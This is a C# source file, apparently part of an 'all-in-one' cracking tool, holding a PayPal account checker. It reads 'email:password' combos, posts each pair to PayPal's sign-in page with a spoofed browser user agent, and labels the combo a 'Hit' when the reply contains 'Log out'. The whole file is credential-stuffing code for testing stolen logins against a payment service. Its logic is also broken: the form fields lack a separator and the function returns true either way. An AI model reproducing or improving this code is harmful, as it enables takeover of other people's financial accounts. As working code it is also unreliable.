using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using System.IO;
using System.Net;

namespace HydraAIO.Modules
{
    internal class paypalmodule
    {
        public static bool checkpaypal(string combo)
        {

            string username = combo.Split(':')[0];
            string password = combo.Split(':')[1];

            string data = "email=" + username + "password=" + password;

            CookieContainer cc = new CookieContainer();
            var request2 = (HttpWebRequest)WebRequest.Create("https://www.paypal.com/signin?intent=checkout&ctxId=ullndg5617253d9ee24859b87230a519f426d6&returnUri=%252Fwebapps%252Fhermes&state=%253Fflow%253D1-P%2526ulReturn%253Dtrue%2526token%253D68909346WP205534E%2526useraction%253Dcommit%2526rm%253D2%2526mfid%253D1493251164212_e335be39b9d1c%2526xclick_params%253DYnVzaW5lc3MlM0RhdGtpbnM3NiUyNTQwbmF2ZXIuY29tJTI2aXRlbV9uYW1lJTNEQ2xpcCUyNTIwRG93bmxvYWQlMjUyMC0lMjUyMCUyNTI4JTI1RUQlMjU5NSUyNTlDJTI1RUElMjVCOCUyNTgwJTI1MjlBbGwlMjUyMHRoYXQlMjUyMGNhdGZpZ2h0JTI1MjB2b2wuMyUyNTIwb2ZmaWNlJTI1MjBzdG9yeSUyNTIwcGFydC4zJTI1MjBQdW5pc2htZW50JTI1MjBjYXRmaWdodCUyNTIwJTI1MjhBbGwlMjUyMHRoYXQlMjUyMGNhdGZpZ2h0JTI1MjB2b2wuMyUyNTI5JTI2YW1vdW50JTNEOC4wMCUyNnJldHVybiUzRGh0dHAlMjUzQSUyNTJGJTI1MkZ3d3cuY2F0ZmlnaHQuY28ua3IlMjUyRnBheXBhbCUyNTJGc3VjY2Vzcy5waHAlMjUzRm9pZCUyNTNEMjAxNzA0MjcwODU5MjE3MDE4JTI2Y2FuY2VsX3JldHVybiUzRGh0dHAlMjUzQSUyNTJGJTI1MkZ3d3cuY2F0ZmlnaHQuY28ua3IlMjUyRnVwZGF0ZXMucGhwJTI2Y2hhcnNldCUzRHV0Zi04JTI2Y2J0JTNETXVzdCUyNTIwY2xpY2slMjUyMHRoaXMlMjUyMGZvciUyNTIwRG93bmxvYWQlMjUyMGNsaXAlMjUyMSUyNTIxJTI2bm9fc2hpcHBpbmclM0QxJTI2cm0lM0QyJTI2bm9fbm90ZSUzRDElMjZ3YV90eXBlJTNEQnV5Tm93JTI2Y291bnRlcnBhcnR5JTNEMTYxNjU1NDAzNzA0MDI2MjY5MA%25253D%25253D&flowId=68909346WP205534E&country.x=KR&locale.x=en_US");

            var postdata = Encoding.ASCII.GetBytes(data);
            request2.Method = "Post";
            request2.ContentType = "application/x-www-form-urlencoded";
            request2.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";


            request2.ContentLength = data.Length;

            using (var stream = request2.GetRequestStream())
            {
                stream.Write(postdata, 0, data.Length);
            }
            var response = (HttpWebResponse)request2.GetResponse();

            string html = new StreamReader(response.GetResponseStream()).ReadToEnd();

            if (html.Contains("Log out"))
            {
                Colorful.Console.WriteLine("[+] Hit - " + combo, Color.Green);
                return true;
            }
            else
            {
                Colorful.Console.WriteLine("[-] Bad - " + combo, Color.Red);
                return true;
            }
        }
    }
}
